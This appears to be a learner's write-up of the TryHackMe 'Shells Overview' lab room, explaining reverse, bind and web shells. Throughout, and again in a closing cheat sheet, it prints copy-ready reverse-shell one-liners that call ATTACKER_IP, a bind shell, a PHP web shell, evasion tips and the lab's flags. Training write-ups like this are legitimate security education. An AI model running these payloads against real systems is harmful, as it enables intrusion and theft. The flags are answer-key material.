# Shells Overview

> TryHackMe | Cyber Security 101  
> Room: [Shells Overview](https://tryhackme.com/room/shellsoverview)  
> Difficulty: Easy | Tags: Shells, Reverse Shell, Bind Shell, Web Shell, Netcat

---

## 📌 Overview

Shells are a core component of the attacker's toolkit — used to remotely
control compromised systems, escalate privileges, exfiltrate data, and
maintain persistence. Understanding how shells work is equally important for
attackers, penetration testers, and defenders.

**Topics covered:**
- What a shell is and why it matters in cybersecurity
- Reverse shells — how they work and common payloads (Bash, PHP, Python, others)
- Bind shells — setup and connection flow
- Shell listeners — Netcat, Rlwrap, Ncat, Socat
- Web shells — how they are deployed and used
- Practical exploitation: command injection → reverse shell, file upload → web shell

**Note:** This room intentionally avoids Metasploit to build a deep
understanding of how shells work at the command level.

---

## 🧠 Task 2 — What is a Shell?

A **shell** is software that allows a user to interact with an OS — typically
a command-line interface. In cybersecurity, it refers to the shell session an
attacker uses after compromising a system.

### What attackers do with shell access

| Activity | Description |
|----------|-------------|
| **Remote System Control** | Execute commands or software on the target remotely |
| **Privilege Escalation** | Explore ways to elevate limited access to admin/root |
| **Data Exfiltration** | Read and copy sensitive files from the system |
| **Persistence** | Create backdoor accounts, copy malware, maintain future access |
| **Post-Exploitation** | Deploy malware, create hidden accounts, delete logs |
| **Pivoting** | Use the compromised system as a launchpad to attack other machines on the network |

> 💡 **Pivoting** is particularly dangerous — the attacker's goal may not be
> the initially compromised machine at all, but a different target accessible
> only through the internal network.

**Task answers:**
- Command-line interface that allows users to interact with an OS → **Shell**
- Using a compromised system to attack other machines → **Pivoting**
- Common activity after shell access to gain higher privileges → **Privilege Escalation**

---

## 🔄 Task 3 — Reverse Shell

### How It Works

In a reverse shell, the **target initiates the connection back to the
attacker**. The attacker sets up a listener first, then triggers a payload
on the target that connects outward.

```
Attacker machine              Target machine
[nc listener on port 443] ←── [reverse shell payload executed]
```

> 💡 Reverse shells are preferred over bind shells because outbound connections
> from a target are often less restricted by firewalls than inbound ones.
> Attackers use well-known ports (53, 80, 443, 8080) to blend shell traffic
> with legitimate web/DNS traffic and evade detection.

### Step 1 — Set Up the Listener

```bash
nc -lvnp 443
```

| Flag | Meaning |
|------|---------|
| `-l` | Listen for incoming connections |
| `-v` | Verbose mode — shows connection details |
| `-n` | No DNS resolution — use IP addresses only |
| `-p` | Port to listen on |

### Step 2 — Execute the Payload on Target

**Pipe Reverse Shell (the classic):**

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
```

Breaking down each part:

| Part | Purpose |
|------|---------|
| `rm -f /tmp/f` | Remove any existing named pipe at `/tmp/f` to avoid conflicts |
| `mkfifo /tmp/f` | Create a named FIFO pipe — enables two-way communication between processes |
| `cat /tmp/f` | Read data from the pipe — waits for input |
| `\| sh -i 2>&1` | Pipe input to an interactive shell; `2>&1` sends stderr to stdout so errors reach the attacker |
| `\| nc ATTACKER_IP PORT` | Send shell output to the attacker via Netcat |
| `>/tmp/f` | Redirect output back into the pipe — completes the bidirectional loop |

### Step 3 — Attacker Receives the Shell

```
attacker@kali:~$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.4.99.209] from (UNKNOWN) [10.10.13.37] 59964
target@tryhackme:~$
```

The connection shows the target's IP (`10.10.13.37`) connecting back to the
attacker (`10.4.99.209`).

**Task answers:**
- Shell type where target connects back to attacker → **Reverse Shell**
- Tool commonly used to set up a listener → **Netcat**

---

## 🔗 Task 4 — Bind Shell

### How It Works

In a bind shell, the **target opens a port and listens** — the attacker
connects to it. The shell is "bound" to a port on the target.

```
Attacker machine              Target machine
[nc connect to port 8080] ──→ [nc listener + shell on port 8080]
```

> 💡 Bind shells are less common than reverse shells because they require an
> open inbound port on the target (often blocked by firewalls) and remain
> active listening for connections, which makes them easier to detect.

### Step 1 — Set Up the Bind Shell on the Target

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
```

Breaking down what's different from the reverse shell:

| Part | Purpose |
|------|---------|
| `nc -l 0.0.0.0 8080` | Netcat listens on all interfaces (`0.0.0.0`) on port `8080` — waits for the attacker to connect |
| `bash -i 2>&1` | Interactive bash shell with stderr redirected to stdout |

> ⚠️ Ports below **1024** require root/elevated privileges to bind. Using
> port 8080 (or any port > 1023) avoids this restriction.

Target terminal (waiting for connection):
```
target@tryhackme:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
```

### Step 2 — Attacker Connects

```bash
nc -nv TARGET_IP 8080
```

| Flag | Meaning |
|------|---------|
| `-n` | No DNS resolution |
| `-v` | Verbose — shows connection status |
| `TARGET_IP` | IP of the machine running the bind shell |
| `8080` | Port the bind shell is listening on |

Attacker terminal after connection:
```
attacker@kali:~$ nc -nv 10.10.13.37 8080
(UNKNOWN) [10.10.13.37] 8080 (http-alt) open
target@tryhackme:~$
```

**Task answers:**
- Shell type that opens a port on target for incoming connections → **Bind Shell**
- Listening below which port requires root access → **1024**

---

## 👂 Task 5 — Shell Listeners

Netcat is not the only way to catch an incoming reverse shell. Different
listeners offer different features — readline history, encryption, verbosity.

### Netcat (nc) — the standard

```bash
nc -lvnp 443
```

Basic, widely available, no extras.

---

### Rlwrap — enhanced interaction

```bash
rlwrap nc -lvnp 443
```

`rlwrap` wraps any command with GNU readline support — adds **arrow key
navigation**, **command history**, and **line editing** to a basic Netcat
session. Useful when the reverse shell is a simple `sh` without readline
support.

---

### Ncat — Netcat with extras (from Nmap project)

```bash
# Basic listener
ncat -lvnp 4444

# With SSL encryption
ncat --ssl -lvnp 4444
```

Ncat is an improved version of Netcat distributed by the Nmap project. Key
advantage: `--ssl` enables encrypted communication — the shell traffic is
encrypted in transit, making it harder for network monitoring to inspect.

SSL output example:
```
Ncat: Generating a temporary 2048-bit RSA key.
Ncat: SHA-1 fingerprint: B7AC F999 7FB0 9FF9 14F5 5F12 6A17 B0DC B094 AB7F
Ncat: Listening on 0.0.0.0:443
```

---

### Socat — socket connection between two data sources

```bash
socat -d -d TCP-LISTEN:443 STDOUT
```

| Part | Meaning |
|------|---------|
| `-d` | Enable verbose output |
| `-d -d` | Increase verbosity further |
| `TCP-LISTEN:443` | Create a TCP server socket on port 443 |
| `STDOUT` | Direct incoming data to the terminal |

Socat is more powerful than Netcat — it can relay between almost any two
data sources (files, sockets, processes, serial ports).

**Task answers:**
- Flexible networking tool for socket connections between two data sources → **Socat**
- Utility providing readline-style editing and history → **Rlwrap**
- Improved Netcat from Nmap project with SSL support → **Ncat**

---

## 💻 Task 6 — Shell Payloads

A shell payload is a command or script that exposes the shell to an incoming
connection (bind) or sends it to the attacker (reverse).

### Bash Payloads

```bash
# Standard bash reverse shell
bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
# Redirects interactive bash I/O through a TCP connection via /dev/tcp

# Readline reverse shell (file descriptor 5)
exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done
# Opens FD 5 as a TCP socket, reads commands line by line, executes and returns output

# File descriptor 196
0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196
# Uses FD 196 to establish TCP connection, shell reads/writes through it

# File descriptor 5 with bash -i
bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5
# Opens interactive bash using FD 5 for all I/O (stdin, stdout, stderr)
```

> 💡 `/dev/tcp/IP/PORT` is a bash built-in — it creates a TCP connection
> without needing any external tool. This makes bash payloads very portable
> on Linux systems where bash is available.

---

### PHP Payloads

All PHP payloads follow the same pattern: create a socket with `fsockopen`,
then execute a shell using one of several PHP execution functions.

```php
# exec function
php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'

# shell_exec function
php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'

# system function — outputs result to browser
php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");'

# passthru function — sends raw output (useful for binary data)
php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3");'

# popen function — opens a process file pointer
php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3", "r");'
```

| Function | Notes |
|----------|-------|
| `exec` | Executes command, returns last line of output |
| `shell_exec` | Executes via shell, returns all output as string |
| `system` | Executes and displays output directly |
| `passthru` | Like system but passes raw binary output — useful for binary data |
| `popen` | Opens a pipe to/from the process |

---

### Python Payloads

All use `python -c '...'` to run inline. Replace `PY-C` with `python -c` in
the commands below.

```python
# Export environment variables + spawn pty
export RHOST="ATTACKER_IP"; export RPORT=443
python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'

# Using subprocess module
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'

# Short version
python -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
```

> 💡 `os.dup2(s.fileno(), 0/1/2)` duplicates the socket's file descriptor
> to stdin (0), stdout (1), and stderr (2) — this makes the shell's I/O
> flow through the network socket instead of the terminal.
> `pty.spawn("bash")` spawns a proper interactive terminal, which is
> important for commands that require a TTY (like `sudo`, `ssh`, `vim`).

---

### Other Payloads

```bash
# Telnet
TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP 443 0<$TF | sh 1>$TF
# Creates a named pipe, connects via Telnet, pipes commands through sh

# AWK (uses built-in TCP capabilities)
awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null

# BusyBox (minimal environments like embedded Linux, containers)
busybox nc ATTACKER_IP 443 -e sh
```

**Task answers:**
- Python module for managing shell commands → **subprocess**
- PHP functions used for remote command execution through TCP → **PHP**
- Scripting language using environment variables and socket connection → **Python**

---

## 🌐 Task 7 — Web Shell

### What is a Web Shell?

A web shell is a **script uploaded to a web server** that executes OS commands
through HTTP requests. It is hidden within the web application and accessed
via a URL — no direct network connection required from the attacker.

**Supported languages:** PHP, ASP, JSP, CGI scripts — any language the
web server can execute.

**How it gets deployed:**
- Unrestricted File Upload vulnerability
- File Inclusion vulnerability
- Command Injection vulnerability
- Unauthorized access to the web server

### Minimal PHP Web Shell

```php
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

Save as `shell.php`, upload to the target web server, then access via URL:

```
http://victim.com/uploads/shell.php?cmd=whoami
http://victim.com/uploads/shell.php?cmd=cat+/etc/passwd
http://victim.com/uploads/shell.php?cmd=cat+/flag.txt
```

The `cmd` GET parameter value is passed directly to `system()` — the output
appears in the browser response.

### Popular Web Shells (for reference)

| Web Shell | Description |
|-----------|-------------|
| [p0wny-shell](https://github.com/flozz/p0wny-shell) | Minimalistic single-file PHP shell — remote command execution |
| [b374k shell](https://github.com/b374k/b374k) | Feature-rich PHP shell — file management, command execution, more |
| [c99 shell](https://www.r57shell.net/single.php?id=13) | Well-known, robust PHP shell with extensive functionality |

More available at: https://www.r57shell.net/index.php

**Task answers:**
- Vulnerability allowing upload of malicious script → **Unrestricted File Upload**
- Malicious script uploaded to exploit a web application → **Web Shell**

---

## 🎯 Task 8 — Practical

### Lab Setup

| URL | What it hosts |
|-----|-------------|
| `MACHINE_IP:8080` | Landing page with links to both challenges |
| `MACHINE_IP:8081` | Web app vulnerable to **command injection** |
| `MACHINE_IP:8082` | Web app vulnerable to **unrestricted file upload** |

---

### Challenge 1 — Command Injection → Reverse Shell

**Goal:** Get a shell via command injection, read `/flag.txt`

#### Step 1 — Start a listener on the AttackBox

```bash
nc -lvnp 443
```

#### Step 2 — Navigate to the command injection page

```
http://MACHINE_IP:8080  →  Command Injection section
```

#### Step 3 — Inject the reverse shell payload

In the input field, enter (replacing `ATTACKER_IP` and `PORT` with your values):

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP 443 >/tmp/f
```

> 💡 The web app passes this input to the OS via a system call (the command
> injection vulnerability). Instead of running a benign command, we inject a
> payload that connects back to our listener.

#### Step 4 — Read the flag

Once the shell connects back:

```bash
ls /
cat /flag.txt
```

**Flag:** `THM{0f28b3e1b00becf15d01a1151baf10fd713bc625}`

---

### Challenge 2 — Unrestricted File Upload → Web Shell

**Goal:** Upload a PHP web shell, use it to read `/flag.txt`

#### Step 1 — Create the web shell file

```bash
nano shell.php
```

Content:

```php
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

Save and exit.

#### Step 2 — Navigate to the file upload page

```
http://MACHINE_IP:8080  →  File Upload section
```

#### Step 3 — Upload `shell.php`

The application has no restriction on uploaded file types — it accepts `.php`
files directly.

> 💡 An "unrestricted file upload" vulnerability means the server does not
> validate the file extension or MIME type. Uploading a `.php` file means the
> web server will execute it as PHP code when accessed.

#### Step 4 — Execute commands via URL

After upload, the shell is accessible at the upload path. Use the `cmd`
parameter to run commands:

```
http://MACHINE_IP:8082/uploads/shell.php?cmd=whoami
http://MACHINE_IP:8082/uploads/shell.php?cmd=ls+/
http://MACHINE_IP:8082/uploads/shell.php?cmd=cat+/flag.txt
```

The `cat /flag.txt` command outputs the flag directly in the browser.

**Flag:** `THM{202bb14ed12120b31300cfbbbdd35998786b44e5}`

---

## 🔍 Thinking Through the Room — Shell Type Comparison

```
Which shell type should I use?

Firewall blocks inbound to target?
└── YES → Reverse Shell (target connects OUT to attacker)
└── NO  → Bind Shell (attacker connects IN to target)

Have web app access but no direct shell?
└── Use Web Shell (upload script, execute via HTTP)

Which listener gives the best interaction?
├── Basic → nc -lvnp PORT
├── Need arrow keys / history → rlwrap nc -lvnp PORT
├── Need encryption → ncat --ssl -lvnp PORT
└── Advanced relay → socat TCP-LISTEN:PORT STDOUT
```

---

## 💡 Insights & Things to Remember

**Port choice matters for evasion:**  
Attackers use ports 443, 80, 53 because outbound traffic on these ports
is expected and often not inspected. A reverse shell on port 443 looks
like HTTPS traffic to a basic firewall.

**Reverse shells are the default for a reason:**  
Most corporate networks allow outbound connections but restrict inbound ones.
Bind shells require the target to have an accessible open port — firewalls
make this unreliable. Reverse shells work in most environments.

**Web shells are the stealthiest persistent access:**  
No persistent process, no unusual open port — just a file on a web server
that executes code when a specific URL is requested. This is why web shell
detection is its own area of security tooling (looking for unusual files in
web directories, monitoring `system()` calls in web server logs).

**`pty.spawn` matters for interactive shells:**  
A raw reverse shell often lacks TTY support — commands like `sudo`, `ssh`,
`vi` may not work. Spawning a PTY with `python -c 'import pty; pty.spawn("bash")'`
on the target after getting a shell upgrades it to a proper interactive
terminal.

**File descriptor tricks are just I/O redirection:**  
All the bash payload variants (FD 5, FD 196) are doing the same thing:
connecting a TCP socket and wiring the shell's stdin/stdout/stderr through
it. The different file descriptor numbers are interchangeable — what matters
is the wiring pattern `0<&FD 1>&FD 2>&FD`.

---

## ⚖️ Reflection

**What clicked:**
- The named pipe (`mkfifo`) trick is the key to making the shell bidirectional
  — without it, you could send commands but not receive output, or vice versa.
  The pipe creates the feedback loop.
- Web shells are conceptually simpler than network shells but arguably more
  dangerous in practice — they blend into web traffic and require no active
  connection to maintain access
- The five PHP execution functions (exec, shell_exec, system, passthru, popen)
  exist because PHP web applications try to disable dangerous functions with
  `disable_functions` in php.ini — having multiple options means one might
  be available even if others are blocked

**Still unclear:**
- How do defenders detect web shells in practice? File integrity monitoring?
  Content inspection? Log analysis for unusual `system()` patterns?
- What is the difference between a TTY and a PTY, and why do some commands
  require one?
- How would this work on Windows targets? The `/dev/tcp` bash trick and
  `mkfifo` are Linux-only.

**Next:**
- SQL Injection room — combine Gobuster (find the endpoint) +
  web shell knowledge (exploit the upload) for a complete attack chain
- Practice stabilizing shells with `python pty.spawn` and `stty raw -echo`

---

## 📚 Quick Reference — Payload Cheat Sheet

```bash
# ── LISTENERS ──────────────────────────────────────────────────────
nc -lvnp 443                          # basic
rlwrap nc -lvnp 443                   # with readline history
ncat -lvnp 443                        # improved nc
ncat --ssl -lvnp 443                  # encrypted
socat -d -d TCP-LISTEN:443 STDOUT     # socket relay

# ── REVERSE SHELLS ─────────────────────────────────────────────────
# Bash
bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1

# Pipe (universal)
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP 443 >/tmp/f

# Python (short)
python -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'

# PHP
php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");'

# BusyBox
busybox nc ATTACKER_IP 443 -e sh

# ── BIND SHELL ─────────────────────────────────────────────────────
# On target (listens)
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
# Attacker connects
nc -nv TARGET_IP 8080

# ── WEB SHELL ──────────────────────────────────────────────────────
# shell.php
<?php if(isset($_GET['cmd'])){ system($_GET['cmd']); } ?>
# Access via URL
http://victim.com/uploads/shell.php?cmd=whoami
http://victim.com/uploads/shell.php?cmd=cat+/flag.txt

# ── UPGRADE SHELL TO TTY ───────────────────────────────────────────
python -c 'import pty; pty.spawn("bash")'
```

---

## 📚 References

- [TryHackMe - Shells Overview](https://tryhackme.com/room/shellsoverview)
- [PayloadsAllTheThings — Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- [p0wny-shell](https://github.com/flozz/p0wny-shell)
- [b374k shell](https://github.com/b374k/b374k)
- [revshells.com — Reverse Shell Generator](https://www.revshells.com/)